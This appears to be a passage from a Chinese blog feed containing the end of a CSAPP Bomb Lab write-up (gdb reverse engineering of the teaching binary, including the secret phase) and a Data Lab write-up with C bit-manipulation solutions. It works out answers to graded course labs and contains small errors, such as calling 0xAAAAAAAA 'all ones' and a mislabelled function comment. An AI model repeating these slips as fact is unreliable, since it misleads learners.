0x4011da</code>到<code>0x4011f5</code>的部分。</p><p>可以将<code>rbx</code>看作当前指针<code>current</code>，这里有个坑在于虽然数据存储的8B，但是在比较时却只使用其中4位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> i = <span class="number">5</span>;</span><br><span class="line">current = keys[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">while</span>(i--)&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span> =</span> current-&gt;next;  <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">if</span>((<span class="type">int</span>)curret-&gt;data &lt; (<span class="type">int</span>)next-&gt;data)&#123; <span class="comment">//</span></span><br><span class="line">  explode_bomb();</span><br><span class="line">  &#125;</span><br><span class="line">  current = next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出需要数据在链表中顺序排列</p><h4 id="6通过分析结果反推密码"><a class="markdownIt-Anchor" href="#6通过分析结果反推密码"></a> 6.通过分析结果反推密码</h4><p>我们通过gdb以此查找处链表中的数据如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">node1: 0x014c</span><br><span class="line">node2: 0x00a8</span><br><span class="line">node3: 0x039c</span><br><span class="line">node4: 0x02b3</span><br><span class="line">node5: 0x01dd</span><br><span class="line">node6: 0x01bb</span><br></pre></td></tr></table></figure><p>所以需要保证其数据为排列为<code>3 4 5 6 1 2</code>，又因为在第2步用7将数据去补数，所以转换后为<code>4 3 2 1 6 5</code></p><h3 id="结束了彩蛋"><a class="markdownIt-Anchor" href="#结束了彩蛋"></a> 结束了？（彩蛋）</h3><p>将所有结果按行写入文件<code>key.txt</code>后，执行<code>./bomb key.txt</code>，会得到以下结果</p><p><img src="https://pic4.zhimg.com/80/v2-9b3695afc8bac4451a797bbe9360cc4c.png" alt="执行结果" /></p><p>但是在看汇编代码时可以看到其实本实验还有一个隐藏部分，在<code>phase_defused</code>中会尝试从有个这样<code>sscanf(0x603870, &quot;%d %d %s&quot;, rdx, rcx, r8)</code>的函数调用，输入串中读入一个<code>&quot;%d %d %s&quot;</code>的数据，并比较其中的<code>%s</code>是否为<code>&quot;DrEvil&quot;</code>，如果符合条件将进入隐藏函数<code>secret_phase</code></p><p>我们看到这个函数 <code>secret_phase</code>中只需判断函数<code>fun7($6030f0, input) == 2</code>即可，函数<code>fun7()</code>表示如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//x($edi) y($esi)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun7</span><span class="params">(<span class="type">void</span>* x, <span class="type">void</span>* y)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0xfffffffff</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(*(<span class="type">int</span> *)x &gt; *(<span class="type">int</span> *)y)&#123;<span class="comment">//part1</span></span><br><span class="line"><span class="keyword">return</span> fun7(x+<span class="number">0x8</span>, y) * <span class="number">2</span>; </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(*(<span class="type">int</span> *)x == *(<span class="type">int</span> *)y)&#123;<span class="comment">//part2</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(*(<span class="type">int</span> *)x &lt; *(<span class="type">int</span> *)y)&#123;<span class="comment">//part3</span></span><br><span class="line"><span class="keyword">return</span> fun7(x+<span class="number">0x10</span>, y)*<span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为保证达到目的，画出递归栈可知道，需要保证递归栈中的顺序为<code>part2 part3 part1</code> （从栈顶向下看）即可。使用gdb查看内存情况如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/16x 0x6030f0    //需要知道 n1 + 8 存储的地址</span><br><span class="line">0x6030f0 &lt;n1&gt;:  0x24    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x6030f8 &lt;n1+8&gt;:        0x10    0x31    0x60    0x00    0x00    0x00    0x00   0x00</span><br><span class="line"></span><br><span class="line">(gdb) x/24x 0x603110//需要知道 n21 + 16 存储的地址</span><br><span class="line">0x603110 &lt;n21&gt;: 0x08    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x603118 &lt;n21+8&gt;:       0x90    0x31    0x60    0x00    0x00    0x00    0x00    0x00</span><br><span class="line">0x603120 &lt;n21+16&gt;:      0x50    0x31    0x60    0x00    0x00    0x00    0x00    0x00</span><br><span class="line"></span><br><span class="line">(gdb) x/8x 0x603150//需要知道 n32存储的值</span><br><span class="line">0x603150 &lt;n32&gt;: 0x16    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure><p>由此知结果应该表示为<code>22</code>(即0x16)</p><p>想要触发并解题，应在任意一道做对后一行输入<code>x x DrEvil</code> (前面两个数字目前看来为任意值)。现在问题转化成如何将这个字符串放在<code>0x6030f0</code>的内存中。</p><p>这让我想到第一次读到<code>skip</code>开始那一段没有看懂的代码（可以回看到<code>phase_1部分</code>）。现在抱着目的性的看就豁然开朗。这里实际上是通过记录输入字符串的数量作为偏移量的，将每个读入的字符串都存在内存中的，相当于一个字符串堆，计算过程如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x603870 - 0x603780 = 240  //偏移总量</span><br><span class="line">240 &gt;&gt; 4 = 240 / 2^4 = 15  //对应shl操作</span><br><span class="line">15 / 5 = 3 //对应lea</span><br></pre></td></tr></table></figure><p>说明在第4个字符串时应该写入这个串，那么读入这个串后如何读入正常的第4个串，其实对于sscanf它根据给定格式匹配，所以第四个字符<code>1 0</code> 后加入能<code>DrEvil</code>即可。不得不说这样的设计还是很精妙的。</p><h2 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h2><p>最后贴图测试结果</p><p><img src="https://pic4.zhimg.com/80/v2-a8b040d6cbb6ba8407f94345439cb3d4.png" alt="测试结果" /></p><p>对于这个实验，我是以直接阅读逆向的汇编代码为主。实际上以做题为目的，将GDB作为主要调试工具更快，更高效。我认为lab2的特点在于循序渐进，它的前后铺垫做的很好，整体做下来对汇编的理解会提升不少。欢迎大家留言讨论，共同学习。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。同时我关注的不仅是实验本身还有实验中使用工具的学习。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;实验说明&quot;&gt;&lt;a class=&quot;markd</summary>
      
    
    
    
    <category term="CSAPP" scheme="https://lcjd99.github.io/categories/CSAPP/"/>
    
    
    <category term="C" scheme="https://lcjd99.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP深入理解计算机系统 Lab1(Data Lab) 详解</title>
    <link href="https://lcjd99.github.io/Course/csapp/Lab1/"/>
    <id>https://lcjd99.github.io/Course/csapp/Lab1/</id>
    <published>2023-10-01T14:51:47.000Z</published>
    <updated>2024-04-12T15:33:45.006Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文以记录个人学习CSAPP的过程，使用blog的方式记录能更专注的思考，不至于走马观花式的做实验。</p></blockquote><h2 id="实验说明"><a class="markdownIt-Anchor" href="#实验说明"></a> 实验说明</h2><p>在动手实验之前建议仔细阅读实验提供的<a href="http://csapp.cs.cmu.edu/3e/datalab.pdf">文档</a>以及<code>bits.c</code>前的注释。本实验对应CSAPP的第二章，是对位运算的处理和应用。在解决这些问题过程中，会对位运算有更深刻的理解。实验中提供13个函数接口，我们需要根据函数前注释的要求实现相应的功能，同时满足所要求的限制条件。</p><h2 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h2><p>我的实验环境是Debian(x86_64)，编译32位的程序需要使用 <code>sudo apt-get install gcc-multilib</code>下载<code>gcc-multilib</code>，这是一个能够实现不同位数的编译器。下载后可以正常<code>make</code>编译。</p><p>实验中的工具<code>dlc</code>和<code>driver.pl</code>中可用<code>-h</code>参数查看使用手册</p><h2 id="一些小坑"><a class="markdownIt-Anchor" href="#一些小坑"></a> 一些小坑</h2><ol><li>使用<code>dlc</code>时出现<code>bits.c:xx:parse error bits.c:xx:undeclared variable xx</code> 是因为该编译器仅仅支持C89的语法,需要将变量全部在代码块的开头声明。</li><li>使用<code>dlc</code>时出现<code>bits.c:284: Warning: suggest parentheses around arithmetic in operand of x</code> 是因为运算符优先级肯存在歧义，建议为优先运算块加括号</li></ol><h2 id="整数规则细节"><a class="markdownIt-Anchor" href="#整数规则细节"></a> 整数规则细节</h2><h3 id="表达式规则"><a class="markdownIt-Anchor" href="#表达式规则"></a> 表达式规则</h3><ol><li>整数的范围在0~255之间，不能使用大整数</li><li>只能使用局部变量和参数</li><li>允许使用单目运算符 <code>! ~</code></li><li>允许使用双目运算符 <code>&amp; ^ | + &lt;&lt; &gt;&gt;</code></li></ol><h3 id="禁止使用"><a class="markdownIt-Anchor" href="#禁止使用"></a> 禁止使用</h3><ol><li>非顺序执行的语句</li><li>宏</li><li>调用函数</li><li>使用不在规定范围内的操作符</li><li>使用强制类型转换</li><li>使用非<code>int</code>类型，使用数组，结构体等</li></ol><h3 id="对运行机器的规定"><a class="markdownIt-Anchor" href="#对运行机器的规定"></a> 对运行机器的规定</h3><ol><li>使用补码，32位整数表示</li><li>按算术方式执行右移</li><li>如果移位数 <code>大于31</code> 或 <code>小于0</code> , 移位有不可预测的行为</li></ol><h2 id="整数具体题解"><a class="markdownIt-Anchor" href="#整数具体题解"></a> 整数具体题解</h2><h3 id="1-bitxor"><a class="markdownIt-Anchor" href="#1-bitxor"></a> 1. bitXor</h3><p>根据异或运算的表达式</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo>⊕</mo><mi>B</mi><mo>=</mo><mo stretchy="false">(</mo><mi>A</mi><mo>∧</mo><mi mathvariant="normal">¬</mi><mi>B</mi><mo stretchy="false">)</mo><mo>∨</mo><mo stretchy="false">(</mo><mi mathvariant="normal">¬</mi><mi>A</mi><mo>∧</mo><mi>B</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A \oplus B = (A \land \lnot B) \lor (\lnot A \land B)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⊕</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">¬</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">¬</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∧</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span></span></span></span></span></p><p>可知代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4                                 </span></span><br><span class="line"><span class="comment"> *   Rating: 1   </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bitXor</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="type">int</span> a = x &amp; ~y;</span><br><span class="line">  <span class="type">int</span> b = ~x &amp; y;</span><br><span class="line">  <span class="type">int</span> ans = ~(~a &amp; ~b);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-tmin"><a class="markdownIt-Anchor" href="#2-tmin"></a> 2. tmin</h3><p>根据补码规则，最高位符号位为1时为负数，CSAPP上有一张图很好解释补码的规则<img src="https://pic4.zhimg.com/80/v2-684360085f1a3a6b097a292443c528cf.png" alt="补码的规则" /><br />所以根据这个规则我们知道最小的补数就是最高位为1，其余为0的数，实现代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">tmin</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"><span class="type">int</span> p = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> p &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-istmax"><a class="markdownIt-Anchor" href="#3-istmax"></a> 3. isTmax</h3><ol><li>同样根据上面的图可知，最大的数和最小的数在补数规则中是完全去反的规则，由此可以找出最大的数。要想不通过<code>==</code>比较两个数，我们可以采用异或后结果是否等于0的方式判断，因为只有相等才会异或为0。</li><li>但是本题禁止使用<code>&lt;&lt;</code>，代表我们需要采用另一种方式实现。我们令最大的数<code>0x7fffffff</code>为<code>a</code>。发现<code>a+a = 0xffffffe</code>(相当于右移一位)，对其去反的结果为1。顺着这个思路我们只需要找到其他满足<code>~(x+x+1) == 0</code>的数排除即可。不难思考，将<code>0xffffffe</code>右移的两种情况中的另一种为<code>0xffffffff</code>（也就是-1）,即<code>-1 + 1 == 0</code>，因此判断逻辑不难表达如下</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isTmax</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="comment">//判断想x+x+1取反后是否为0,tag可减少一个符号的使用</span></span><br><span class="line">  <span class="type">int</span> tag = x + <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> tmp1 = ~(x + tag);</span><br><span class="line">  <span class="type">int</span> flag1 = !tmp1;</span><br><span class="line">  <span class="comment">//判断是否为-1</span></span><br><span class="line">  <span class="type">int</span> flag2 = !tag;</span><br><span class="line">  <span class="comment">//产生结果后</span></span><br><span class="line">  <span class="keyword">return</span> flag1 &amp; !flag2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-alloddbits"><a class="markdownIt-Anchor" href="#4-alloddbits"></a> 4. allOddBits</h3><p>题目需要找到所有奇数位都是1的数，可以通过移动一位后，判断或运算是否所有位都是1来判断结果,其中全位都是1就是-1，可以再简化判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">allOddBits</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> t = <span class="number">0xaa</span> | (<span class="number">0xaa</span> &lt;&lt; <span class="number">8</span>) | (<span class="number">0xaa</span> &lt;&lt; <span class="number">16</span>) | (<span class="number">0xaa</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">  <span class="type">int</span> a = x &amp; t;</span><br><span class="line">  <span class="type">int</span> b = a &gt;&gt; <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> c = a | b;</span><br><span class="line">  <span class="type">int</span> ans = !(c + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-negate"><a class="markdownIt-Anchor" href="#5-negate"></a> 5. negate</h3><p>直接使用补码定义即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-isasciidigit"><a class="markdownIt-Anchor" href="#6-isasciidigit"></a> 6. isAsciiDigit</h3><p>主要思路是首先通过判断高位(4到7位)的为<code>0011b</code>,可以同时判断其他位是否为0,然后判断最后一位，观察发现（可以通过卡诺图辅助），满足条件的如下：满足0xxx (x表示任意)或者是8或9,实现代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> y = x &amp; <span class="number">0xf</span>;</span><br><span class="line">  <span class="type">int</span> z = (x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  <span class="type">int</span> flag1 = (!(y&gt;&gt;<span class="number">3</span>)) | ( !(y ^ <span class="number">8</span>) | !(y ^ <span class="number">9</span>));</span><br><span class="line">  <span class="type">int</span> flag2 = !(z ^ <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">return</span> flag1 &amp; flag2 ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述的符号数为13，符合规定。但是观察发现，每次都需要使用<code>!</code>,我们可以通过摩根公式化简<code>flag1</code>,筛选掉不要的值，观察发现，在<code>11xxb</code>和<code>1x1xb</code>是需要剔除的元素,代码简化后如下,只需要11个符号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">isAsciiDigit</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> flag1 = !((x &amp; <span class="number">0xa</span>) ^ <span class="number">0xa</span>);</span><br><span class="line">  <span class="type">int</span> flag2 = !((x &amp; <span class="number">0xc</span>) ^ <span class="number">0xc</span>);</span><br><span class="line">  <span class="type">int</span> flag3 = ((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">return</span> !(flag1 | flag2 | flag3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-conditional"><a class="markdownIt-Anchor" href="#7-conditional"></a> 7. conditional</h3><p>我们需要通过<strong>任何非1的数</strong>生成出<code>0xffffffff</code>(也就是-1)，同时0还是0。这个算法可以把思路转化为通过1生成0，通过0生成-1，那么也就-1对数减1即可。<br />具体可见代码注释</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">conditional</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y, <span class="type">int</span> z)</span> &#123;</span><br><span class="line">  <span class="comment">//产生-1</span></span><br><span class="line">  <span class="type">int</span> neg = ~<span class="number">0</span>;</span><br><span class="line">  <span class="comment">//!!x保证任何非0数为1，0还是0</span></span><br><span class="line">  <span class="type">int</span> mask = !!x + neg;</span><br><span class="line">  <span class="comment">//使用掩码的方式实现条件</span></span><br><span class="line">  <span class="keyword">return</span> (y &amp; ~mask) | (z &amp; mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-islessorequal"><a class="markdownIt-Anchor" href="#8-islessorequal"></a> 8. isLessOrEqual</h3><p>本题需要分为两种情况，两个数异号和同号，</p><p><em>异号</em>的情况是如果相减会溢出，我们通过符号位的特点判断结果，观察发现，异号时结果和x的符号位同步</p><p><em>同号</em>的情况相减判断符号位即可，这里的技巧是由于0和正数的符号位相同，因此采用<code>y - x &gt;= 0</code>判断会简化过程</p><p>最后将两种情况通过掩码合并。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">  <span class="comment">//符号位</span></span><br><span class="line">  <span class="type">int</span> s1 = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="type">int</span> s2 = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">//s1 == s2 ? 1 : 0</span></span><br><span class="line">  <span class="type">int</span> mask = !(s1 ^ s2);</span><br><span class="line">  <span class="comment">// y - x</span></span><br><span class="line">  <span class="type">int</span> diff = y + (~x) + <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// y - x &gt;= 0 ? 1 : 0</span></span><br><span class="line">  <span class="type">int</span> flag2 = !(diff &gt;&gt; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (mask &amp; flag2) | ((!mask) &amp; (s1 &amp; <span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-logicalneg"><a class="markdownIt-Anchor" href="#9-logicalneg"></a> 9. logicalNeg</h3><p>本题需要充分利用符号位，由于最终需要实现的结果是逻辑非，如何识别出0就十分关键。在<code>allOddBits</code>一题最后我们通过为<code>-1 + 1</code>和<code>0 + 1</code>实现能让全1转换为0，全0转换为1的方法，本题同样借鉴这个思路。而0的特点是，其补码和就是其本身，具有同样特性的还有<code>0x80000000</code>(也就是前面找到的<em>最小数</em>），通过观察发现他们的区别在于<em>最小数</em>最小数和其补数做或运算后最高位为1，而0做相同运算后结果为0。再利用其符号右移的特性，能构造出需要的<code>0xAAAAAAAA</code>(全1)或<code>0</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 